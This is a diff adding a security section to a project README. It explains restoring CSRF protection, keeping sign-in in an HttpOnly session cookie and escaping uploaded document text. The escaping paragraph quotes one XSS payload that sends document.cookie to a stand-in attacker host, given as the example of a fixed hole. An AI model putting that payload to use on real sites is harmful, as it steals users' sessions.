@@ -24,6 +24,44 @@ Runs on one free **Groq** key. Runs at all with no key.
 
 ---
 
+## Security and sessions
+
+**CSRF protection is on.** The API previously used a `SessionAuthentication`
+subclass with `enforce_csrf()` stubbed out, justified by "endpoints are still
+protected by IsAuthenticated". That reasoning is inverted: a CSRF attack works
+*because* the visitor is signed in — the browser attaches the session cookie to
+a cross-site request by itself, `IsAuthenticated` passes, and the request goes
+through. Both templates were already sending `X-CSRFToken` on every call, so the
+exemption had no purpose left. It is gone, and importing the old class now
+raises rather than silently re-opening the hole.
+
+**Staying signed in is a cookie, not localStorage.** The login page has a
+"Keep me signed in for 30 days" tick. Ticked, the session cookie lasts 30 days
+and refreshes on each visit. Unticked, it dies when the browser closes — the
+right default on a shared machine.
+
+It is deliberately not stored in `localStorage`. The session cookie is
+`HttpOnly`, so no script on the page can read it. Anything in `localStorage` is
+readable by every script that runs, so a single XSS anywhere in the app would be
+enough to lift the account. The cookie is also sent automatically, so there is
+nothing for the frontend to remember, drop or leak.
+
+`localStorage` is used, but only for interface state: which document is
+selected, an unsent question, and the recent transcript per document. Keys are
+namespaced per username so two people sharing a browser do not inherit each
+other's state.
+
+**Document text is escaped before it reaches the page.** Source snippets come
+straight out of an uploaded file. A PDF containing
+`<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` used to be
+inserted with `innerHTML` and would have run. Every value that originates in a
+document or a model response now goes through an escaper first.
+
+For production, set `DEBUG=false` and `CSRF_TRUSTED_ORIGINS=https://yourdomain`.
+Secure cookies, HSTS, nosniff and `X-Frame-Options: DENY` switch on with it.
+
+---
+
 ## Run it
 
 ```bash
